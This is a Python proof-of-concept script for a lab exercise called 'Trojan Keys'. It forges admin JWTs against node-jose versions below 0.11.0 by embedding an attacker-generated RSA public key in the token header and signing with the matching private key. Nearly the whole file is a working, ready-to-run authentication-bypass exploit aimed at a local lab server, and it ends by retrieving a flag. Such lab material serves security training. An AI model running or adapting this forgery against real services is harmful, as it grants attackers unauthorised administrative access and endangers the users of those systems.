#!/usr/bin/env python3
"""
Lab #6 - Trojan Keys
Vulnerability : node-jose < 0.11.0 uses header.jwk as the verification key
Attack        : embed attacker public key in the token header, sign with matching private key
"""
import argparse, base64, json, sys
import requests
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from pwn import log


def parse_args():
    p = argparse.ArgumentParser(description='Lab #6 - Trojan Keys PoC')
    p.add_argument('--url', default='http://localhost:3000', metavar='URL',
                   help='target base URL (default: http://localhost:3000)')
    return p.parse_args()


def b64url_enc(b):
    if isinstance(b, str):
        b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


def int_to_b64url(n):
    length = (n.bit_length() + 7) // 8
    return b64url_enc(n.to_bytes(length, 'big'))


def forge_token(private_key, payload: dict) -> str:
    pub = private_key.public_key().public_numbers()
    jwk = {
        'kty': 'RSA', 'use': 'sig', 'alg': 'RS256',
        'n': int_to_b64url(pub.n),
        'e': int_to_b64url(pub.e),
    }
    header = b64url_enc(json.dumps({'alg': 'RS256', 'typ': 'JWT', 'jwk': jwk}, separators=(',', ':')))
    body   = b64url_enc(json.dumps(payload, separators=(',', ':')))
    sig    = b64url_enc(private_key.sign(f'{header}.{body}'.encode(), padding.PKCS1v15(), hashes.SHA256()))
    return f'{header}.{body}.{sig}'


def main():
    args = parse_args()
    base_url = args.url.rstrip('/')

    s = requests.Session()

    log.info(f'Target: {base_url}')
    log.info('Logging in as alice...')
    r = s.post(f'{base_url}/api/login', json={'username': 'alice'})
    r.raise_for_status()
    log.success(f'Legitimate token: {s.cookies["session"][:72]}...')

    log.info('Generating attacker RSA keypair...')
    attacker_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    forged = forge_token(attacker_key, {'name': 'hacker', 'role': 'admin', 'iat': 1715000000})
    log.info(f'Forged token (embedded JWK): {forged[:72]}...')

    r = requests.get(f'{base_url}/api/admin/tokens', cookies={'session': forged})
    if r.status_code != 200:
        log.failure(f'Unexpected status {r.status_code}: {r.text}')
        sys.exit(1)

    log.success(f'FLAG: {r.json()["flag"]}')


if __name__ == '__main__':
    main()
